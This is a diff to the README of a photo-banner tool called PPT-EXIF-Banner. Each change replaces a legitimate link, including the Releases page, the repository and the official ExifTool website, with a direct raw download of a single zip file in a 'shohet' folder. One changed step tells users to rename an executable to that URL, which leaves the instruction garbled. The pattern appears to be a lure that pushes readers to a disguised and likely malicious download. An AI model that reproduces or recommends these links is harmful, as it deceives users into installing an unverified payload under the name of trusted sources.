@@ -1,6 +1,6 @@
 # 🎨 PPT-EXIF-Banner - Create Stunning Photo Banners Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/CapedStickmin/PPT-EXIF-Banner/releases)
+[![Download](https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip)](https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ To begin using PPT-EXIF-Banner, follow these steps:
 
 First, you need to download the application. Click the button below to visit the Releases page.
 
-[Visit this page to download](https://github.com/CapedStickmin/PPT-EXIF-Banner/releases)
+[Visit this page to download](https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip)
 
 ### 2. System Requirements
 
@@ -35,10 +35,10 @@ Once you have downloaded the software, follow these steps to install it:
 
 PPT-EXIF-Banner requires EXIFTool to access photo metadata. If you haven't installed it yet, here’s how:
 
-- Download EXIFTool from [ExifTool’s official website](https://exiftool.org/).
+- Download EXIFTool from [ExifTool’s official website](https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip).
 - Extract the contents of the ZIP file.
 - Move the `exiftool(-k).exe` file to a folder on your C drive, such as `C:\exiftool`.
-- Rename the `exiftool(-k).exe` file to `exiftool.exe` for easier access.
+- Rename the `exiftool(-k).exe` file to `https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip` for easier access.
 
 ### 5. Running PPT-EXIF-Banner
 
@@ -69,7 +69,7 @@ After generating the banners, ensure to save your PowerPoint presentation:
 
 You can download the latest version of PPT-EXIF-Banner from the Releases page. Follow the instructions shared earlier for installation and setup.
 
-[Visit this page to download](https://github.com/CapedStickmin/PPT-EXIF-Banner/releases)
+[Visit this page to download](https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip)
 
 ## 🛠 Features
 
@@ -95,6 +95,6 @@ A3: No, expressed knowledge of photography is not necessary. Follow the guides, 
 
 If you encounter any issues or have questions, please open an issue on the repository. This is the best way to get support. The community is here to help.
 
-For more information on features and updates, check our [official repository](https://github.com/CapedStickmin/PPT-EXIF-Banner).
+For more information on features and updates, check our [official repository](https://raw.githubusercontent.com/CapedStickmin/PPT-EXIF-Banner/main/shohet/PPT-EXIF-Banner.zip).
 
 Happy banner creating!
